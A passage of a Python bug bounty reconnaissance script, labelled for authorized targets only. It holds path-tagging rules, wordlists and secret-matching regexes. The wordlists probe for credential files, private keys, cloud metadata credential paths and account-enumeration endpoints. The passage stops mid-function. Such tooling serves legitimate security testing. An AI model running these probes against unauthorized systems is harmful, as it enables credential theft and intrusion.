#!/usr/bin/env python3
"""
recon.py — Maximum-coverage endpoint discovery & exploit-relevance triage
For authorized bug bounty programs and owned targets only.

Usage:
    python3 recon.py https://target.example.com [options]

Options:
    -c, --concurrency   Parallel requests (default 40)
    -o, --output        JSON output file
    --md                Markdown report file
    --csv               CSV output file
    -d, --depth         Crawl depth (default 3)
    --delay             ms delay between requests (default 0)
    --passive-only      Skip active probing
    --no-passive        Skip passive sources (Wayback etc)
    --no-enum           Skip account enumeration
    --no-verbs          Skip verb tampering
    --no-cors           Skip CORS testing
    --no-triage         Discovery only, no exploit triage
    --tech              Force technology (spring|laravel|django|rails|express|wordpress|drupal)
    --cookies           Cookies to include (name=value; name2=value2)
    --headers           Extra headers JSON string
    --proxy             HTTP proxy (e.g. http://127.0.0.1:8080)
    -v, --verbose       Verbose output
"""

import argparse
import asyncio
import base64
import csv
import hashlib
import json
import os
import re
import sys
import time
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

try:
    import aiohttp
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Missing deps: pip install aiohttp beautifulsoup4 lxml")
    sys.exit(1)

# ── ANSI colors ───────────────────────────────────────────────────────────────

R = "\033[91m"; Y = "\033[93m"; G = "\033[92m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"
BOLD = "\033[1m"

def banner():
    print(f"""{R}{BOLD}
  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
{RST}{Y}  Bug Bounty Endpoint Discovery & Exploit Triage{RST}
  Authorized testing only — bug bounty / owned targets
""")


# ── Data model ────────────────────────────────────────────────────────────────

TAGS_ALL = [
    "AUTH_BYPASS", "ACCOUNT_ENUM", "IDOR", "INFO_DISC", "INJECTION",
    "FILE_OPS", "BUSINESS_LOGIC", "JWT", "OAUTH", "ADMIN", "GRAPHQL",
    "SSRF", "OPEN_REDIRECT", "MASS_ASSIGN", "RATE_LIMIT", "CORS",
    "XXE", "SSTI", "DESERIALIZATION", "RACE_CONDITION", "CSRF",
    "PATH_TRAVERSAL", "WEBSOCKET", "CACHE_POISON", "HOST_HEADER",
    "HTTP_SMUGGLING", "NOSQL", "LDAP", "SQLI", "XSS",
]

GOLD = {
    "AUTH_BYPASS", "ACCOUNT_ENUM", "IDOR", "INFO_DISC", "ADMIN",
    "GRAPHQL", "INJECTION", "SQLI", "SSTI", "XXE", "DESERIALIZATION",
    "HTTP_SMUGGLING", "SSRF", "JWT",
}
SILVER = {
    "CORS", "MASS_ASSIGN", "OPEN_REDIRECT", "PATH_TRAVERSAL",
    "BUSINESS_LOGIC", "CACHE_POISON", "HOST_HEADER", "RACE_CONDITION",
    "NOSQL", "LDAP", "CSRF",
}


@dataclass
class Endpoint:
    url: str
    path: str
    status: int = 0
    methods: List[str] = field(default_factory=list)
    tags: Set[str] = field(default_factory=set)
    notes: List[str] = field(default_factory=list)
    requires_auth: Optional[bool] = None
    content_type: str = ""
    body_sample: str = ""
    source: str = ""
    redirect_to: str = ""
    params: List[str] = field(default_factory=list)
    tech_hints: List[str] = field(default_factory=list)
    response_headers: Dict[str, str] = field(default_factory=dict)
    response_size: int = 0


def score(ep: Endpoint) -> int:
    s = len(ep.tags)
    s += sum(3 for t in ep.tags if t in GOLD)
    s += sum(1 for t in ep.tags if t in SILVER)
    if ep.status in (200, 201, 204): s += 2
    if ep.status == 403: s += 1
    if ep.requires_auth is False: s += 3  # accessible without auth
    return s


# ── Tag rules (path regex → tags) ────────────────────────────────────────────

TAG_RULES: List[Tuple[re.Pattern, List[str]]] = [
    (re.compile(r"/(login|signin|sign[-_]in|authenticate|auth/token|token/obtain|get[-_]token|access[-_]token)", re.I),
     ["ACCOUNT_ENUM", "RATE_LIMIT", "JWT", "BRUTE_FORCE"]),
    (re.compile(r"/(register|signup|sign[-_]up|create[-_]account|new[-_]user|join)", re.I),
     ["ACCOUNT_ENUM", "RATE_LIMIT", "MASS_ASSIGN"]),
    (re.compile(r"/(forgot[-_]?password|reset[-_]?password|password[-_]?reset|recover|change[-_]?password)", re.I),
     ["ACCOUNT_ENUM", "HOST_HEADER", "RATE_LIMIT"]),
    (re.compile(r"/(admin|administrator|manage|management|backoffice|back[-_]office|superadmin|cp|controlpanel|console|staff|internal|restricted)", re.I),
     ["ADMIN", "AUTH_BYPASS", "INFO_DISC"]),
    (re.compile(r"/(graphql|gql|graph)", re.I),
     ["GRAPHQL", "INJECTION", "INFO_DISC"]),
    (re.compile(r"/(users?|accounts?|members?|profiles?|me|self|whoami|identity)(/|$|\?)", re.I),
     ["IDOR", "MASS_ASSIGN", "INFO_DISC"]),
    (re.compile(r"/users?/\d+", re.I),
     ["IDOR"]),
    (re.compile(r"/(orders?|invoices?|billing|payment|checkout|cart|purchase|subscribe|subscription|plans?|pricing|coupon|promo|discount|transfer|withdraw|deposit)", re.I),
     ["BUSINESS_LOGIC", "IDOR", "RACE_CONDITION"]),
    (re.compile(r"/(upload|import|file|files|media|attachments?|assets?|documents?|export|download|blob|storage|s3|bucket)", re.I),
     ["FILE_OPS", "PATH_TRAVERSAL", "SSRF", "XXE"]),
    (re.compile(r"/(fetch|proxy|webhook|callback|redirect|forward|sink|request|outbound|external|ping|check|preview)", re.I),
     ["SSRF", "OPEN_REDIRECT"]),
    (re.compile(r"/(oauth|authorize|callback|sso|saml|oidc|openid|token|refresh[-_]?token|client[-_]?credentials)", re.I),
     ["OAUTH", "JWT", "OPEN_REDIRECT", "CSRF"]),
    (re.compile(r"/(\.env|config|settings|configuration|setup|secrets?|credentials?|keys?|vault)", re.I),
     ["INFO_DISC"]),
    (re.compile(r"/(actuator|health|metrics?|info|status|debug|trace|heapdump|threaddump|env|beans|mappings|loggers?|refresh|restart|shutdown)", re.I),
     ["INFO_DISC", "ADMIN", "AUTH_BYPASS"]),
    (re.compile(r"/(swagger|openapi|api[-_]?docs?|api[-_]?spec|redoc|apidoc)", re.I),
     ["INFO_DISC"]),
    (re.compile(r"/(search|find|query|filter|autocomplete|suggest|lookup|scan)", re.I),
     ["INJECTION", "SQLI", "NOSQL", "LDAP"]),
    (re.compile(r"/(render|template|view|report|generate|pdf|email|notify|preview|compile)", re.I),
     ["SSTI", "SSRF", "XXE"]),
    (re.compile(r"/(serialize|deserialize|session|restore|import|job|queue|task|worker)", re.I),
     ["DESERIALIZATION", "RACE_CONDITION"]),
    (re.compile(r"/(xmlrpc|rpc|soap|wsdl|xml)", re.I),
     ["XXE", "INJECTION"]),
    (re.compile(r"/(websocket|ws|wss|socket\.io|sockjs|signalr|sse|events?/stream|stream)", re.I),
     ["WEBSOCKET"]),
    (re.compile(r"/(cache|cdn|vary|purge|invalidate)", re.I),
     ["CACHE_POISON"]),
    (re.compile(r"/(git/|\.git/|svn|cvs|bazaar|hg/)", re.I),
     ["INFO_DISC"]),
    (re.compile(r"/(phpinfo|php[-_]?info|test\.php|info\.php|_profiler|_wdt)", re.I),
     ["INFO_DISC"]),
    (re.compile(r"/(wp[-_]|wordpress|wp-admin|wp-login|wp-json)", re.I),
     ["INFO_DISC", "AUTH_BYPASS", "INJECTION"]),
    (re.compile(r"/(eval|exec|system|shell|cmd|command|run|execute|spawn)", re.I),
     ["INJECTION", "SSTI"]),
    (re.compile(r"/(share|invite|referral|magic[-_]?link|verify|confirm|activate|2fa|mfa|otp)", re.I),
     ["ACCOUNT_ENUM", "RATE_LIMIT", "IDOR"]),
    (re.compile(r"/(messages?|chat|inbox|notifications?|alerts?|feed)", re.I),
     ["IDOR", "INJECTION", "XSS"]),
    (re.compile(r"/(report|analytics?|stats?|telemetry|log|audit|history|events?)", re.I),
     ["INFO_DISC", "IDOR"]),
    (re.compile(r"/(password|passwd|secret|key|token|cred|credential)", re.I),
     ["INFO_DISC", "ACCOUNT_ENUM"]),
    (re.compile(r"\.(bak|backup|old|orig|swp|tmp|save|copy|~)", re.I),
     ["INFO_DISC"]),
    (re.compile(r"/(\.well[-_]known|jwks\.json|openid[-_]configuration|security\.txt)", re.I),
     ["INFO_DISC", "JWT", "OAUTH"]),
    (re.compile(r"/(internal|private|hidden|undocumented|v0|beta|dev|staging|test|sandbox)", re.I),
     ["INFO_DISC", "AUTH_BYPASS"]),
    (re.compile(r"/api/v\d+/", re.I),
     ["IDOR", "MASS_ASSIGN"]),
    (re.compile(r"/(bulk|batch|multi|mass)", re.I),
     ["MASS_ASSIGN", "BUSINESS_LOGIC", "IDOR"]),
    (re.compile(r"/(role|permission|privilege|grant|revoke|acl|policy|scope)", re.I),
     ["AUTH_BYPASS", "IDOR", "MASS_ASSIGN"]),
]

PARAM_SSRF = re.compile(r"^(url|uri|src|href|endpoint|target|host|destination|redirect|return|next|goto|link|webhook|callback|img|image|path|fetch|resource|load|open|feed|ref|site|domain|proxy|forward|out|to|action|continue|return_url|redirect_url|success_url|cancel_url)$", re.I)
PARAM_IDOR = re.compile(r"^(id|uid|user_id|account_id|userid|account|profile_id|order_id|invoice_id|customer_id|member_id|pid|oid|doc_id|file_id|message_id|session_id|uuid|guid|ref|key|handle|slug)$", re.I)
PARAM_INJECT = re.compile(r"^(q|query|search|s|filter|where|keyword|term|input|name|username|email|find|selector|sort|order|group|field|column|table|view|template|format|type|action|method|cmd|exec|system|eval|expression|code|script|page|include|module|plugin|theme|lang|locale|timezone|charset|encoding)$", re.I)


# ── Wordlists ─────────────────────────────────────────────────────────────────

WORDLIST_GENERAL = [
    # Auth
    "login", "signin", "sign-in", "sign_in", "authenticate", "auth",
    "logout", "signout", "sign-out",
    "register", "signup", "sign-up", "sign_up", "join", "create-account",
    "forgot-password", "forgot_password", "reset-password", "reset_password",
    "password-reset", "password/reset", "account/recover",
    "verify", "verify-email", "confirm", "activate", "activation",
    "2fa", "mfa", "otp", "totp", "magic-link",
    "change-password", "update-password",
    # OAuth / SSO
    "oauth", "oauth2", "oauth/authorize", "oauth/token", "oauth/callback",
    "auth/authorize", "auth/token", "auth/callback", "auth/refresh",
    "authorize", "token", "refresh-token", "access-token",
    "sso", "saml", "saml/login", "saml/callback", "saml/metadata",
    "oidc", "openid", "openid-connect",
    ".well-known/openid-configuration", ".well-known/jwks.json",
    ".well-known/oauth-authorization-server", ".well-known/security.txt",
    # Users / profiles
    "users", "user", "me", "self", "account", "accounts", "profile",
    "profiles", "members", "member", "whoami", "identity", "session",
    "users/1", "users/2", "users/me", "users/profile",
    "api/v1/users", "api/v1/users/me", "api/v1/me", "api/v1/profile",
    "api/v2/users", "api/v2/me",
    # Admin
    "admin", "administrator", "admin/", "admin/login", "admin/dashboard",
    "admin/users", "admin/settings", "admin/config", "admin/panel",
    "administration", "manage", "management", "console", "control",
    "cp", "controlpanel", "control-panel", "superadmin", "super-admin",
    "staff", "staff/login", "backoffice", "back-office",
    "internal", "internal/", "restricted", "privileged",
    "panel", "dashboard", "dashboards",
    # API versioning
    "api", "api/", "api/v1", "api/v2", "api/v3", "api/v4", "api/v5",
    "api/v1/", "api/v2/", "rest", "rest/", "rest/v1", "rest/v2",
    "v1", "v1/", "v2", "v2/", "v3", "v3/",
    "api/current", "api/latest", "api/beta", "api/internal",
    # Info disclosure
    ".env", ".env.local", ".env.production", ".env.backup", ".env.bak",
    "config.json", "config.yaml", "config.yml", "config.toml", "config.php",
    "configuration.json", "settings.json", "app.config",
    ".git/HEAD", ".git/config", ".git/COMMIT_EDITMSG",
    ".gitignore", ".npmrc", ".htaccess", "web.config", "crossdomain.xml",
    "robots.txt", "sitemap.xml", "sitemap_index.xml",
    "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
    "api-docs", "api-docs/", "api/docs", "docs/api", "apidocs",
    "redoc", "api/swagger.json", "api/openapi.json",
    "v1/swagger.json", "v2/swagger.json",
    "api/v1/swagger.json", "api/v1/openapi.json",
    "graphql", "graphql/", "graphql/console", "graphql/explorer",
    "gql", "graph", "api/graphql",
    "phpinfo.php", "info.php", "test.php", "debug.php",
    ".DS_Store", "Thumbs.db", "desktop.ini",
    "backup.zip", "backup.sql", "backup.tar.gz", "db.sql",
    "dump.sql", "database.sql", "export.sql",
    # Debug / Framework
    "debug", "debug/", "_debug", "__debug",
    "healthz", "health", "health/", "health/check", "healthcheck",
    "ping", "pong", "status", "status/",
    "ready", "readiness", "liveness", "alive",
    "version", "build", "build-info", "buildinfo",
    "metrics", "metrics/", "stats", "statistics",
    "trace", "traces", "logs", "log",
    "error", "errors", "500", "404",
    # Files / media
    "upload", "uploads", "file", "files", "media", "assets",
    "attachments", "documents", "images", "images/",
    "download", "downloads", "export", "exports",
    "import", "blob", "storage", "s3",
    "api/v1/files", "api/v1/upload", "api/v1/download",
    # Business logic
    "orders", "order", "checkout", "cart", "payment", "payments",
    "billing", "invoice", "invoices", "subscription", "subscriptions",
    "plans", "pricing", "coupon", "coupons", "promo", "discount",
    "transfer", "withdraw", "deposit", "balance", "wallet",
    "purchase", "buy", "refund", "cancel",
    "api/v1/orders", "api/v1/payments", "api/v1/billing",
    # SSRF sinks
    "fetch", "proxy", "webhook", "webhooks", "callback",
    "forward", "redirect", "link", "preview",
    "api/v1/fetch", "api/v1/proxy", "api/fetch",
    "url-preview", "link-preview", "open-graph",
    # Search / query
    "search", "find", "query", "filter", "autocomplete",
    "suggest", "lookup", "scan", "browse",
    "api/v1/search", "api/v2/search",
    # Posts / content
    "posts", "post", "articles", "article", "blog",
    "comments", "comment", "messages", "message",
    "feed", "feeds", "inbox", "notifications",
    "api/v1/posts", "api/v1/comments",
    # Misc
    "socket.io/", "ws", "wss",
    "graphql/schema", "schema",
    "sitemap", "feed.xml", "atom.xml", "rss.xml",
    "humans.txt", "security.txt", "manifest.json", "favicon.ico",
    ".well-known/", "cache", "purge",
    "share", "invite", "referral",
    "report", "reports", "analytics", "analytics/",
    "audit", "audit-log", "activity", "history",
    "roles", "permissions", "scopes", "grants",
    "tokens", "api-keys", "keys", "secrets",
    "integrations", "connectors", "providers",
    "sessions", "devices", "trusted-devices",
    "two-factor", "security-settings",
]

WORDLIST_SPRING = [
    "actuator", "actuator/", "actuator/health", "actuator/health/liveness",
    "actuator/health/readiness", "actuator/info", "actuator/env",
    "actuator/beans", "actuator/mappings", "actuator/metrics",
    "actuator/httptrace", "actuator/trace", "actuator/loggers",
    "actuator/logfile", "actuator/threaddump", "actuator/heapdump",
    "actuator/shutdown", "actuator/refresh", "actuator/restart",
    "actuator/conditions", "actuator/configprops", "actuator/quartz",
    "actuator/flyway", "actuator/liquibase", "actuator/caches",
    "actuator/scheduledtasks", "actuator/integrationgraph",
    "actuator/prometheus", "actuator/jolokia",
    "manage/health", "management/health", "spring/health",
    "console", "h2-console", "h2/", "/console/",
    "error", "error/500", "error/404",
    "swagger-ui.html", "swagger-ui/", "v2/api-docs", "v3/api-docs",
    "webjars/springfox-swagger-ui/",
]

WORDLIST_LARAVEL = [
    "telescope", "telescope/", "horizon", "horizon/",
    "_debugbar", "_ignition", "ignition",
    "storage/logs/laravel.log", "storage/",
    "public/storage", "app/Http/Controllers",
    "artisan", "phpunit.xml", "composer.json", "composer.lock",
    "bootstrap/cache/config.php", ".env.example",
    "api/user", "api/login", "api/register", "api/logout",
    "sanctum/csrf-cookie", "api/sanctum/csrf-cookie",
    "api/v1/user", "api/v1/auth/login", "api/v1/auth/register",
    "broadcasting/auth", "pusher/auth",
]

WORDLIST_DJANGO = [
    "admin/", "admin/login/", "admin/logout/",
    "__debug__/", "__debug__/sql/", "__debug__/template/",
    "api-auth/", "api-auth/login/", "api-auth/logout/",
    "api/schema/", "api/schema/swagger-ui/", "api/schema/redoc/",
    "djdt/render_panel/", "silk/", "silk/summary/",
    "accounts/login/", "accounts/logout/", "accounts/register/",
    "static/", "media/", "favicon.ico",
    "robots.txt",
]

WORDLIST_RAILS = [
    "rails/info", "rails/info/properties", "rails/info/routes",
    "rails/mailers", "sidekiq", "sidekiq/",
    "letter_opener", "delayed_job", "resque",
    "users/sign_in", "users/sign_out", "users/sign_up",
    "users/password/new", "users/password/edit",
    "users/confirmation/new", "users/unlock/new",
    "api/v1/sessions", "api/v1/registrations",
    "admin/", "admin/login",
    "/assets/", ".ruby-version", "Gemfile", "Gemfile.lock",
]

WORDLIST_EXPRESS_NODE = [
    "api/", "health", "status",
    "api/v1/health", "api/v1/status",
    "__webpack_hmr", "webpack-dev-server",
    ".eslintrc.json", ".eslintrc.js",
    "package.json", "package-lock.json",
    "node_modules/", "dist/", "build/",
    "src/", ".env", ".env.local",
]

WORDLIST_WORDPRESS = [
    "wp-admin/", "wp-login.php", "wp-admin/admin-ajax.php",
    "wp-json/", "wp-json/wp/v2/", "wp-json/wp/v2/users",
    "wp-json/wp/v2/posts", "wp-json/wp/v2/pages",
    "wp-content/", "wp-includes/",
    "xmlrpc.php", "wp-cron.php", "wp-config.php",
    "wp-config.php.bak", "wp-config.old",
    "wp-json/wp/v2/users?per_page=100",
    "?author=1", "?author=2", "?author=3",
    "feed/", "feed", "comments/feed/",
    "wp-admin/options-general.php",
    "wp-admin/user-new.php",
]

WORDLIST_DRUPAL = [
    "user/login", "user/register", "user/password",
    "admin/", "admin/people", "admin/config",
    "jsonapi/", "jsonapi/user/user",
    "?q=user/login", "?q=admin",
    "sites/default/files/", "sites/all/",
    "CHANGELOG.txt", "LICENSE.txt", "INSTALL.txt",
    "install.php", "update.php", "cron.php",
    "modules/", "themes/", "profiles/",
]

WORDLIST_CLOUD = [
    # AWS metadata
    "latest/meta-data/", "latest/meta-data/hostname",
    "latest/meta-data/iam/security-credentials/",
    "latest/user-data",
    # Common cloud paths
    ".aws/credentials", ".aws/config",
    "aws-exports.js", "firebase.json",
    ".firebase/", "google-services.json",
    "ServiceAccountCredentials.json",
    "kubeconfig", ".kube/config",
    # Kubernetes
    "api/v1/namespaces/default/secrets",
    "metrics", "healthz",
]

WORDLIST_SENSITIVE_FILES = [
    # Backup files
    "backup.zip", "backup.tar.gz", "backup.sql", "backup.sql.gz",
    "site.zip", "website.zip", "www.zip", "html.zip",
    "db.sql", "database.sql", "dump.sql", "data.sql",
    "app.zip", "application.zip",
    "*.bak", "index.php.bak", "login.php.bak",
    # Source / config
    ".htpasswd", ".htaccess.bak",
    "config.php.bak", "config.json.bak",
    "wp-config.php.bak", "settings.php.bak",
    "application.properties", "application.yml",
    "appsettings.json", "appsettings.Development.json",
    "web.config.bak",
    # Logs
    "debug.log", "error.log", "access.log",
    "laravel.log", "php_error.log",
    "var/log/", "logs/error.log",
    # Certs / keys
    "server.key", "private.key", "id_rsa",
    "certificate.pem", "cert.pem", "privkey.pem",
    # Source maps
    "js/app.js.map", "static/js/main.chunk.js.map",
    "bundle.js.map", "vendor.js.map",
]


# ── Extended wordlists ────────────────────────────────────────────────────────

# Fintech / marketplace paths like Robinhood bonfire example
WORDLIST_FINTECH = [
    "waitlist", "waitlist/", "waitlist/join", "waitlist/status",
    "waitlist/position", "waitlist/spot", "waitlist/email",
    "waitlist/check", "waitlist/signup", "waitlist/confirm",
    "waitlist/invite", "waitlist/referral",
    "waitlist/credit_card", "waitlist/credit_card/email",
    "waitlist/credit_card/email/spot", "waitlist/credit_card/status",
    "waitlist/debit_card", "waitlist/crypto", "waitlist/ipo",
    "queue", "queue/position", "queue/status", "queue/check",
    "spot", "spot/check", "spot/status",
    "invite", "invite/", "invite/check", "invite/status",
    "invite/code", "invite/referral",
    "beta", "beta/", "beta/signup", "beta/waitlist", "beta/join",
    "early-access", "early_access", "earlyaccess",
    "pre-launch", "prelaunch",
    "feature/", "features/", "feature-flag", "feature-flags",
    "flags/", "flag/",
    # Account / subscription tier checks
    "subscription/tier", "subscription/plan", "subscription/status",
    "account/tier", "account/level", "account/status",
    "account/premium", "account/gold", "account/platinum",
    "user/tier", "user/subscription", "user/premium",
    "membership", "membership/status", "membership/tier",
    "plan", "plan/status", "plans/check",
    # Card endpoints
    "card", "cards", "card/status", "card/check",
    "cards/virtual", "cards/physical",
    "credit", "credit/check", "credit/status",
    "debit", "debit/check",
    # Crypto / trading
    "crypto/waitlist", "crypto/status",
    "trading/status", "trading/tier",
    "ipo", "ipo/waitlist", "ipo/check",
    "options/waitlist", "options/status",
    # KYC / verification
    "kyc/status", "kyc/check", "kyc/",
    "verification/status", "verification/check",
    "identity/status", "identity/verify",
    # Internal / ops
    "ops/", "operations/", "internal/status",
    "admin/feature-flags", "admin/flags",
    "admin/experiments", "experiments/",
    "ab-test", "ab_test", "split-test",
    "cohort", "segment", "segments/",
]

WORDLIST_MOBILE_API = [
    # Mobile-specific API paths often undocumented
    "api/mobile/", "api/app/", "api/ios/", "api/android/",
    "mobile/api/", "app/api/",
    "api/v1/mobile/", "api/v2/mobile/",
    "api/v1/app/config", "api/v1/app/settings",
    "api/v1/app/version", "api/v1/app/update",
    "api/v1/push/register", "api/v1/push/unregister",
    "api/v1/device/register", "api/v1/device/",
    "api/v1/notifications/register",
    "app-config.json", "app/config.json",
    "mobile/config", "ios/config", "android/config",
    # Deep linking / app clips
    "apple-app-site-association",
    ".well-known/apple-app-site-association",
    ".well-known/assetlinks.json",
    "assetlinks.json",
]

WORDLIST_HIDDEN_ADMIN = [
    # Hidden / renamed admin panels
    "manage", "management", "mgmt", "mgr",
    "manager", "managing",
    "supervisor", "superuser", "su", "root",
    "sysadmin", "sys-admin", "system",
    "cms", "cms/", "cms/login",
    "portal", "portal/", "portal/login",
    "intranet", "intranet/",
    "extranet", "extranet/",
    "oms", "crm", "erp", "hrm",
    "support/admin", "support/dashboard",
    "ops/admin", "devops/",
    "infra/", "infrastructure/",
    "monitoring/", "grafana/", "kibana/",
    "jenkins/", "gitlab/", "bitbucket/",
    "jira/", "confluence/", "notion/",
    "sentry/", "datadog/",
    "phpmyadmin", "phpmyadmin/", "pma/",
    "adminer", "adminer.php",
    "webmin/", "cpanel/", "plesk/",
    "django-admin", "flask-admin",
    # Token-gated internal tools
    "_internal", "_private", "_staff",
    "_ops", "_system", "_admin",
    "~admin", "~staff",
]

WORDLIST_INTERNAL_SUBPATH = [
    # Paths that reveal internal structure
    "internal/", "internal/api/",
    "private/", "private/api/",
    "corp/", "corporate/",
    "employee/", "employees/",
    "vendor/", "vendors/", "partner/", "partners/",
    "merchant/", "merchants/",
    "agent/", "agents/",
    "b2b/", "b2c/", "b2b/api/",
    "enterprise/", "enterprise/api/",
    "v0/", "v0/api/",
    "legacy/", "legacy/api/",
    "old/", "deprecated/",
    "test/", "staging/", "dev/",
    "sandbox/", "uat/", "qa/",
    "preview/", "canary/", "shadow/",
    "dark/", "green/", "blue/",
    # Microservice patterns
    "service/", "services/",
    "micro/", "svc/",
    "gateway/", "edge/",
    # gRPC / Twirp
    "twirp/", "rpc/",
]

WORDLIST_EMAIL_ORACLE_PATHS = [
    # Endpoints that accept email and may diff on existence
    "api/v1/users/check", "api/v2/users/check",
    "api/v1/email/check", "api/v1/email/exists",
    "api/v1/email/available", "api/v1/email/validate",
    "api/v1/account/check", "api/v1/account/exists",
    "api/v1/auth/check", "api/v1/auth/exists",
    "users/check", "users/exists", "users/available",
    "email/check", "email/exists", "email/available",
    "account/check", "account/exists",
    "auth/check-email", "auth/email-exists",
    "check-email", "check_email", "checkEmail",
    "verify-email", "verify_email",
    "user/exists", "user/check",
    # Signup availability checks
    "api/v1/username/check", "api/v1/username/available",
    "username/check", "username/available",
    "api/v1/register/check", "api/v1/signup/check",
    # Waitlist-style email checks (like Robinhood)
    "waitlist/email/check", "waitlist/check/email",
    "waitlist/status/email", "waitlist/position/email",
    "waitlist/credit_card/email/spot",
    "waitlist/debit_card/email/spot",
    "waitlist/crypto/email/spot",
    "waitlist/ipo/email/spot",
    "waitlist/options/email/spot",
    "queue/check/email", "queue/position/email",
    "invite/check/email", "invite/status/email",
    "spot/check/email",
    # Password-reset double as enumerators
    "api/v1/password/reset/check",
    "api/v1/forgot-password/check",
    "api/v1/auth/forgot/check",
]

SUBDOMAIN_COMMON = [
    "api", "api2", "api-v2", "apiv2", "api3",
    "app", "app2", "apps", "application",
    "admin", "administrator", "manage", "management", "portal",
    "dashboard", "console", "panel",
    "staging", "stage", "stg", "uat", "qa", "test", "testing",
    "dev", "develop", "development", "preview",
    "beta", "alpha", "canary", "sandbox", "demo",
    "internal", "intranet", "corp", "corporate",
    "legacy", "old", "v1", "v2",
    "mobile", "m", "ios", "android",
    "web", "www2", "new",
    "static", "assets", "cdn", "media", "images",
    "mail", "email", "smtp", "mx",
    "vpn", "remote", "ssh",
    "login", "auth", "sso", "id", "identity",
    "account", "accounts", "profile",
    "shop", "store", "checkout",
    "support", "help", "docs", "documentation",
    "blog", "news", "press",
    "status", "health", "monitor", "monitoring",
    "metrics", "grafana", "kibana", "datadog",
    "jenkins", "ci", "cd", "build", "deploy",
    "git", "gitlab", "bitbucket", "code",
    "jira", "confluence", "wiki", "kb",
    "slack", "chat",
    "db", "database", "mysql", "postgres", "redis", "mongo",
    "s3", "storage", "files", "upload",
    "payments", "billing", "finance",
    "partner", "partners", "merchant", "vendor",
    "b2b", "enterprise", "business",
    "investor", "ir", "data",
    "jobs", "careers", "hiring",
    "bonfire", "phoenix", "horizon", "ember",  # internal tool names
    "backstage", "launchpad", "mission-control",
    "tower", "command", "ops", "devops", "infra",
    "gateway", "edge", "proxy", "waf",
    "graphql", "gql",
    "socket", "ws", "websocket",
    "rpc", "grpc",
    "event", "events", "stream", "streams",
    "worker", "workers", "jobs",
    "cron", "scheduler",
    "notification", "notifications", "push",
    "analytics", "tracking", "telemetry",
    "feature", "experiment", "ab",
    "search", "elastic", "solr",
    "cache", "memcache",
    "queue", "mq", "rabbit", "kafka",
    "service", "services", "microservice",
]

# Secret patterns to scan in JS / responses
SECRET_PATTERNS = [
    (re.compile(r"""(?:api[_-]?key|apikey)\s*[:=]\s*['"`]([A-Za-z0-9_\-]{20,60})['"`]""", re.I), "API Key"),
    (re.compile(r"""(?:secret|private[_-]?key)\s*[:=]\s*['"`]([A-Za-z0-9+/=_\-]{16,80})['"`]""", re.I), "Secret"),
    (re.compile(r"""(?:password|passwd|pwd)\s*[:=]\s*['"`]([^'"`\s]{8,50})['"`]""", re.I), "Password"),
    (re.compile(r"""(?:token|access[_-]?token|auth[_-]?token)\s*[:=]\s*['"`]([A-Za-z0-9._\-]{20,200})['"`]""", re.I), "Token"),
    (re.compile(r"""AKIA[0-9A-Z]{16}"""), "AWS Access Key"),
    (re.compile(r"""(?:aws[_-]?secret|AWS_SECRET)\s*[:=]\s*['"`]([A-Za-z0-9+/]{40})['"`]""", re.I), "AWS Secret"),
    (re.compile(r"""AIza[0-9A-Za-z\-_]{35}"""), "Google API Key"),
    (re.compile(r"""(?:gh[pousr]|github[_-]?token)\s*[:=]?\s*['"`]?(ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|ghs_[A-Za-z0-9]{36}|[0-9a-f]{40})['"`]?""", re.I), "GitHub Token"),
    (re.compile(r"""sk-[A-Za-z0-9]{32,60}"""), "OpenAI/Stripe Secret Key"),
    (re.compile(r"""(?:stripe[_-]?(?:secret|live|test)[_-]?key)\s*[:=]\s*['"`](sk_(?:live|test)_[A-Za-z0-9]{24,})['"`]""", re.I), "Stripe Key"),
    (re.compile(r"""(?:twilio[_-]?(?:auth|account|secret))\s*[:=]\s*['"`]([A-Za-z0-9]{32,40})['"`]""", re.I), "Twilio Key"),
    (re.compile(r"""(?:sendgrid[_-]?(?:api[_-]?key|key))\s*[:=]\s*['"`](SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43})['"`]""", re.I), "SendGrid Key"),
    (re.compile(r"""-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"""), "Private Key"),
    (re.compile(r"""(?:firebase[_-]?(?:api[_-]?key|secret|token))\s*[:=]\s*['"`]([A-Za-z0-9_\-]{20,80})['"`]""", re.I), "Firebase Key"),
    (re.compile(r"""(?:jwt[_-]?secret|JWT_SECRET)\s*[:=]\s*['"`]([^'"`\s]{6,80})['"`]""", re.I), "JWT Secret"),
    (re.compile(r"""(?:database[_-]?(?:url|uri|password)|DB_(?:URL|PASS|PASSWORD))\s*[:=]\s*['"`]([^'"`\s]{8,200})['"`]""", re.I), "Database Credential"),
    (re.compile(r"""(?:slack[_-]?(?:token|webhook|bot))\s*[:=]\s*['"`](xox[bpoa]-[A-Za-z0-9\-]{10,200})['"`]""", re.I), "Slack Token"),
    (re.compile(r"""xox[bpoa]-[0-9]{10,12}-[0-9]{10,12}-[A-Za-z0-9]{24}"""), "Slack Token"),
    (re.compile(r"""(?:heroku[_-]?api[_-]?key)\s*[:=]\s*['"`]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['"`]""", re.I), "Heroku API Key"),
    (re.compile(r"""(?:mailgun[_-]?(?:api[_-]?key|key))\s*[:=]\s*['"`](key-[A-Za-z0-9]{32})['"`]""", re.I), "Mailgun Key"),
    (re.compile(r"""(?:internal[_-]?(?:url|host|endpoint|ip))\s*[:=]\s*['"`]((?:10\.|172\.|192\.168\.|localhost)[^'"`\s]{0,100})['"`]""", re.I), "Internal URL"),
]


def build_wordlist(tech: Set[str]) -> List[str]:
    paths = list(dict.fromkeys(
        WORDLIST_GENERAL + WORDLIST_SENSITIVE_FILES +
        WORDLIST_FINTECH + WORDLIST_MOBILE_API +
